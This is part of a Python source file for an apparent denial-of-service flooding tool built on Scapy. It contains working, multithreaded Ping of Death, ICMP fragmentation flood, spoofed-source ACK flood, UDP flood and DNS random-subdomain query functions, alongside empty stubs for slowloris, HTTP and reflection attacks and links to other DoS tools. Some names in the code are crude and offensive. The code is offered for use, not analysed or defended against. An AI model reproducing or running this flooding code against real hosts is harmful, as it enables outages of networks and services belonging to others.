	def subPod(src,dst,times,inter):
			packet = IP(dst=dst, flags=2)/ICMP(type=8)/("shrek"*13000)
			send(packet, verbose=0, loop=1, inter=inter)

	if power:
		cpu_count = multiprocessing.cpu_count()
		try:		
			print("Starting multithreaded Ping of Death. Using %s threads" % cpu_count)
			for i in range(0,cpu_count):
				thread = threading.Thread(target=subPod,args=(src,dst,times,inter))
				thread.start()
		except (KeyboardInterrupt,SystemExit):
			for i in range(cpu_count):
				thread = threading.Thread(target=subPod,args=(src,dst,times,inter))
				thread.stop()
				thread.kill()
	else:
		print("Starting Ping of Death..")
		subPod(src,dst,times,inter)
	
	return 0 



#################
#   PING FLOOD  #
#################

# The MTU should be considered; 1500B is maximum for general purpose networks (https://pt.wikipedia.org/wiki/MTU)
def pingFlood(src,dst,times,inter,power):#ICMP echo request Flood (aka Ping of Death)
	global frag
	#https://www.ietf.org/rfc/rfc0792.txt
	#https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html
	def subPingFlood(src,dst,times,inter):
		if frag: # Fragmentation / TEAR attack (ICMP & UDP) -> Scapy flag 1 is actually MF and flag 2 is DF!!!
			print("Using fragmentation ICMP Flood..")
			if times != 0:
				for i in range (0,times):
					packet=IP(dst=dst, flags=1, id=RandShort(), 
						      frag=random.randint(1,1024))/ICMP(type=8)/("shrek"*42)
					send(packet, verbose=0, inter=inter) 
			while 1:
				packet=IP(dst=dst, flags=1, id=RandShort(), 
					      frag=random.randint(1,1024))/ICMP(type=8)/("shrek"*42)
				send(packet, verbose=0, inter=inter)
		else:
			print("Shreking with ICMP Flood..")
			if times != 0:
				packet=IP(dst=dst)/ICMP(type=8)/("shrek"*42) # payload != randomized for increased pps; might be a future implementation (feature/option)
				send(packet, verbose=1, count=times, inter=inter) # count=times OR for i in [0,times]?
			else:
				#packet=IP(dst=dst)/ICMP(type=8)/("shrek"*42) # payload != randomized for increased pps; might be a future implementation (feature/option)
				packet=IP(dst=dst, flags=2, frag=0)/ICMP(type=8)/("shrek"*42) # payload != randomized for increased pps; might be a future implementation (feature/option)
				send(packet, verbose=0, loop=1, inter=inter)
	
	# 'POWER' flag set
	if power:
		# Flag bit -> 1 = Dont Fragment; 2 = More Fragments (https://en.wikipedia.org/wiki/IPv4#Flags) HOWEVER! -> Scapy flag 1 is actually MF and flag 2 is DF!!!
		cpu_count = multiprocessing.cpu_count()
		try:		
			print("Starting multithreaded ICMP (echo-reply) Flood. Using %s threads" % cpu_count)
			for i in range(0,cpu_count):
				thread = threading.Thread(target=subPingFlood,
					                      args=(src,dst,times,inter))
				thread.start()
		except (KeyboardInterrupt,SystemExit):
			for i in range(0,cpu_count):
				thread = threading.Thread(target=subPingFlood,
					                      args=(src,dst,times,inter))
				thread.stop()
				thread.kill()
	else:
		subPingFlood(src,dst,times,inter)

	return 0

#################
#   ACK FLOOD   #
#################

def ackFlood(src,dst,times,sport,dport,inter,power):
	global frag
	loopit = 0 if times != 0 else 1
	if frag:
		packet = IP(src=src, dst=dst, flags=1, id=RandShort(), 
			        frag=random.randint(1,1024))/TCP(flags="A", sport=sport, 
			        dport=dport, seq=RandShort(), window=RandShort())/fuzz(Raw())	
	else:
		packet = IP(src=src, dst=dst)/TCP(flags="A", sport=sport, dport=dport, 
			        seq=RandShort(), window=RandShort())/fuzz(Raw())
	print("ACK flooding %s:%d.." % (dst,dport))
	tic = time.process_time()
	if loopit:
		send(packet, verbose=0, loop=loopit, inter=inter)
	else: #while 1: #send(packet, loop=1) OR while 1: send(packet)?
		send(packet, verbose=0, loop=loopit, count=times, inter=inter)
	toc = time.process_time() - tic
	print("ACK flood ended (dur: %f)" % toc)
	return 0


#################
#   POST-SHAKE  #
#################

def postAckFlood(dst,times,dport):
	# Alternative ACK Flood that establishes TCP 3-way Handshake first
	#if dport == 0: dport = RandShort() # dport cannot be random as it requires 3 way handshake completion
	global frag, sport
	packet = IP(dst=dst)/TCP(flags="A", sport=sport ,dport=dport, 
		        seq=RandShort(), window=RandShort())/fuzz(Raw())		
	try:
		socket_=socket.socket()
		socket_.connect((dst,dport))
		stream=StreamSocket(socket_)
	except ConnectionRefusedError:
		print("Couldn't complete the 3-way handshake..")
		pass
	print("Stompin'n'Shrekin!")
	if times == 0:
		send(packet, verbose=0,loop=1)
	elif times != 0:
		#for i in range(0,times):
		send(packet, verbose=0,count=times)

	return 0

#################
#   UDP FLOOD   #
#################

def udpFlood(src,dst,times):
	print("UDP Flood with random data..")
	packet = IP(src=src,dst=dst)/UDP(sport=RandShort(),dport=RandShort())/fuzz(Raw())
	send(packet,verbose=0,loop=1)
	return 0

#################
#   UDP PLAIN   #
#################

def udpPlainFlood(src,dst,times,dport):
	print("UDP Plain Flood started")
	if dport == 0: dport = 68 # Just using the dchp ports as default..
	packet = IP(src=src,dst=dst)/UDP(dport=dport)
	send(packet,verbose=0,loop=1)
	return 0

def spoofedFlood(src,dst,times,dport): # In this attack type, we required both Source IP address and Destination IP. The source will be the victim of reflection and Destination will be the target for spoofed requests

	return 0 


def dnsFlood():
	dns.resolver.default_resolver = dns.resolver.Resolver(configure=False)
	dns.resolver.default_resolver.nameservers = ['8.8.8.8', '2001:4860:4860::8888'] # Make it receive a specific IP for the authoritative DNS server! (this is google's)
	#while 1:
	s = randomStr()
	sr1(IP(dst="8.8.8.8")/UDP()/DNS(rd=2,qd=DNSQR(qname=s + ".google.com")), timeout=1)
	reqs = dns.resolver.query(s+'.google.com','aaaa')
	for res in reqs:
		print(res)
#
	return 0

def rudyFlood():

	return 0


#https://www.electricmonk.nl/log/2016/07/05/exploring-upnp-with-python/
def upnpFlood():

	return 0

def httpGetFlood():

	return 0

def httpPostFlood():

	return 0

def slowLoris():
	global ua_list
	randomUser = random.choice(ua_list)
	print("Cosen UA:\n",randomUser)

	return 0

#https://scapy.readthedocs.io/en/latest/api/scapy.layers.sixlowpan.html
# Nota: isto é util para no futuro testar o Netflow com Softflowd a capturar/recolher IPv6, por exemplo
def sixLowLifeDisabledMidgetPorn():# Ignore placeholder names

	return 0

# Utility for dns subdomain requests
def randomStr(size=8):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(size))

if __name__ == "__main__":
	try:
		main()
	except (KeyboardInterrupt):
		sys.exit("\nGET SHREKT")



#https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/
#https://github.com/ep4sh/pyddos/blob/master/Slowloris.py
#https://github.com/adrianchifor/pyslowloris/blob/master/slowloris.py
#https://github.com/gkbrk/slowloris/blob/master/slowloris.py
#https://github.com/ep4sh/pyddos
#https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool/blob/master/SYN-Flood.py
#https://github.com/vodkabears/synflood/blob/master/synflood.py
#https://security.radware.com/ddos-knowledge-center/ddospedia/

